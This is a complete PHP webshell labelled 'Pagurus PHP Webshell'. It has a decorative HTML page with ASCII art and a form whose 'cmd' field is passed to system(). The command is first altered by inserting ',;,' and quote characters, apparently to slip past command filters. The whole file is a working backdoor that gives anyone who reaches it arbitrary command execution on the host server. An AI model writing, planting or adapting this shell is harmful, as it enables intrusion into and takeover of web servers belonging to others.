<title>Pagurus PHP Webshell</title>
<html>
<body style="background-color:#8B0000;">
<p style="font-family:'Courier New'">
<center>
<table>
    <thead>
        <tr>
            <th colspan="0"></th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><pre>
       ___     ___
     .i .-'   `-. i.
   .'   `/     \'  _`.
   |,-../ o   o \.' `|
(| |   /  _\ /_  \   | |)
 \\\  (_.'.'"`.`._)  ///
  \\`._(..:   :..)_.'//
   \`.__\ .:-:. /__.'/
    `-i-->.___.<--i-'
    .'.-'/.=^=.\`-.`.
   /.'  //     \\  `.\
  ||   ||       ||   ||
  \)   ||       ||  (/
       \)       (/    </pre></td>
            <td><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="40">
<input type="SUBMIT" value="Execute">
</form></td>
        </tr>
    </tbody>
</table>
</p>
</center>
<pre>
<?php
  if(isset($_GET['cmd']))
      {
        $my_str = $_GET['cmd'];
        // Replace / add strings
	$g4p = " ";
	$obfs = ",;,";
        $my_strs = substr_replace($my_str, $obfs, 0, 0 );
        $my_strz = substr_replace($my_strs, '""', -2, 0);
        system($my_strz);
      }
?>
</pre>
</body>
</html>
